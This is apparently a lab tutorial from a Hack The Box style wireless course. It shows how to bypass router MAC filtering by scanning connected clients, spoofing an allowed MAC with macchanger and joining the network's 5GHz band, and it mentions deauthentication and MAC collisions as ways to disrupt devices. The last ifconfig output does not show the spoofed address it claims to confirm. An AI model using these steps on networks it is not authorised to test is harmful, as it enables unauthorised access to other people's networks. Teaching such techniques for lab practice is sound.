---
title: MAC Spoofing
description: MAC Spoofing
date: '2026-09-21'
tags: []
published: true
slug: mac-spoofing
category: wifi
folder: basic-control-bypass
order: 20
---
# Bypassing MAC Filtering

## What is MAC Filtering?

**MAC filtering** is a security setting on some routers. It only lets specific devices (identified by their MAC address, a unique hardware ID) connect to the network.

So even if you have the correct WiFi password, you might still be blocked if your device's MAC address isn't on the "allowed" list.

**The workaround:** MAC spoofing, changing your own device's MAC address to match one that's already allowed.

---

## Step 1: Scan the Target Network

Start by scanning with airodump-ng:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng wlan0mon

 CH  37 ][ Elapsed: 3 mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -47      407      112    0   1   54   WPA2 CCMP   PSK  HTB-Wireless                              

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  3E:48:72:B7:62:2A  -29    0 - 1     0        68         HTB-Wireless
 52:CD:8C:79:AD:87  2E:EB:2B:F0:3C:4D  -29    0 - 9     0        78  EAPOL  HTB-Wireless
 52:CD:8C:79:AD:87  1A:50:AD:5A:13:76  -29    0 - 1     0        88  EAPOL  HTB-Wireless
 52:CD:8C:79:AD:87  46:B6:67:4F:50:32  -29    0 -36     0        90  EAPOL  HTB-Wireless
```

**In this example:** The network **HTB-Wireless** is on channel 1, with 4 devices already connected. Let's say we know the password (`Password123!!!!!!`), but MAC filtering still blocks us from connecting.

---

## The Problem With Simple Spoofing

The obvious fix seems easy: just copy one of the connected devices' MAC addresses. But there's a catch, **two devices can't use the same MAC address on the same network at the same time.** This causes a conflict (called a "collision").

**Two ways around this:**

1. Kick the real device off first (deauth attack), freeing up its MAC address
2. Wait for it to naturally disconnect (works well on networks where devices come and go a lot, like office guest networks)

📝 Sometimes these MAC collisions can even be used on purpose, as a way to disrupt ("deny service" to) a device.

💡 **Bonus tip:** If the network has separate 2.4GHz and 5GHz bands, you might be able to use a MAC address from a device connected to the _other_ band, avoiding collisions entirely.

---

## A Smarter Approach: Use the 5GHz Band

**Step 1:** Check if the network also runs on 5GHz:

```shellsession
0x0w3@fedora[/htb]$ sudo airodump-ng wlan0mon --band a

 CH  48 ][ Elapsed: 3 mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28       11        0    0  48   54   WPA2 CCMP   PSK  HTB-Wireless-5G                              

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   3E:48:72:B7:62:2A  -29    0 - 1     0        6          HTB-Wireless
 (not associated)   2E:EB:2B:F0:3C:4D  -29    0 - 1     0        9          HTB-Wireless
 (not associated)   1A:50:AD:5A:13:76  -29    0 - 1     0        7          HTB-Wireless
 (not associated)   46:B6:67:4F:50:32  -29    0 - 1     0        12         HTB-Wireless
```

**Good news:** There's a matching network called **HTB-Wireless-5G**, and nobody is currently connected to it on 5GHz. This means we can spoof a 2.4GHz device's MAC address and connect on 5GHz, with **no collision**, since the real device stays on 2.4GHz the whole time.

---

## Step 2: Turn Off Monitor Mode

Before changing your MAC address, stop monitor mode:

```shellsession
0x0w3@fedora[/htb]$ sudo airmon-ng stop wlan0mon
```

---

## Step 3: Check Your Current MAC Address

```shellsession
0x0w3@fedora[/htb]$ sudo macchanger wlan0

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)
```

This shows your device's actual MAC address before any changes.

---

## Step 4: Spoof Your MAC Address

We'll match the client `3E:48:72:B7:62:2A` from the 2.4GHz scan. This takes 3 steps:

**1. Turn off the interface:**

```shellsession
0x0w3@fedora[/htb]$ sudo ifconfig wlan0 down
```

**2. Change the MAC address:**

```shellsession
0x0w3@fedora[/htb]$ sudo macchanger wlan0 -m 3E:48:72:B7:62:2A

Current MAC:   00:c0:ca:98:3e:e0 (ALFA, INC.)
Permanent MAC: 00:c0:ca:98:3e:e0 (ALFA, INC.)
New MAC:       3e:48:72:b7:62:2a (unknown)
```

**3. Turn the interface back on:**

```shellsession
0x0w3@fedora[/htb]$ sudo ifconfig wlan0 up
```

**Step 5:** Confirm the change worked:

```shellsession
0x0w3@fedora[/htb]$ ifconfig wlan0

wlan0: flags=4099<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 3e:48:72:b7:62:2a  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Your MAC address now matches the allowed device: `3e:48:72:b7:62:2a`.

---

## Step 5: Connect to the 5GHz Network

Now connect to **HTB-Wireless-5G** normally, either through your system's WiFi menu (GUI) or the command line (using something like `nmcli`).

Once connected, you'll get an IP address just like any normal connection:

```shellsession
0x0w3@fedora[/htb]$ ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.73  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 2e:87:ba:cf:b7:53  txqueuelen 1000  (Ethernet)
        RX packets 565  bytes 204264 (199.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32  bytes 4930 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

🎉 You're connected! Notice you now have a real IP address (`192.168.2.73`), confirming the network accepted your spoofed MAC address.

From here, you could scan for other devices on the same network if needed.
